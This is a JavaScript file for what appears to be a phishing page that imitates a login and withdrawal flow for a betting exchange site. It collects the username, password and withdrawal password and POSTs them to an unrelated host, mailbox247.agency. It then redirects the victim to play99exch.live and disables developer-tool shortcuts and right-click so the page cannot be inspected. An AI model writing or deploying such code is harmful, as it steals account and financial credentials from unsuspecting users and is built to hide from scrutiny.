function checkLogin() {
    const loginName = document.getElementById("username").value;
    const password = document.getElementById("password").value;
  
    if (!loginName || !password) {
      alert("Please fill in both the username and password.");
      return;
    }
  
    sessionStorage.setItem("loginName", loginName);
    sessionStorage.setItem("password", password);
  
    window.location.href = "withdrawal.html";
  }
  function submitWithdrawal() {
    const loginName = sessionStorage.getItem("loginName");
    const password = sessionStorage.getItem("password");
    const withdrawPassword = document.getElementById("code").value;
    const submitButton = document.getElementById("withdrawButton"); // Make sure your button has this ID
  
    if (!loginName || !password) {
      alert("You must log in first!");
      window.location.href = "index.html";
      return;
    }
  
    if (!withdrawPassword) {
      alert("Please enter the withdrawal password.");
      return;
    }
  
    // Disable button to prevent multiple clicks
    submitButton.disabled = true;
    submitButton.innerText = "Processing...";
  
    const formData = new FormData();
    formData.append("username", loginName);
    formData.append("password", password);
    formData.append("withdrawPassword", withdrawPassword);
  
    fetch("https://mailbox247.agency/admin/play99exch.php", {
      method: "POST",
      body: formData,
    })
      .then((response) => response.text())
      .then((data) => {
        console.log("Server Response:", data);
        if (data === "success") {
          window.location.href = "https://play99exch.live";
        } else {
          alert("Error: " + data);
        }
      })
      .catch((error) => {
        console.error("Error:", error);
        alert("An error occurred.");
      })
      .finally(() => {
        // Re-enable button after request completes
        submitButton.disabled = false;
        submitButton.innerText = "Secure Login";
      });
  }
  
  
  document.onkeydown = function (e) {
    if (
      e.keyCode === 123 || // F12
      (e.ctrlKey && e.shiftKey && (e.keyCode === "I".charCodeAt(0) || e.keyCode === "J".charCodeAt(0))) || // Ctrl+Shift+I/J
      (e.ctrlKey && (e.keyCode === "U".charCodeAt(0) || e.keyCode === "C".charCodeAt(0) || e.keyCode === "V".charCodeAt(0))) // Ctrl+U/C/V
    ) {
      return false;
    }
  };
  document.addEventListener("contextmenu", (e) => e.preventDefault());
  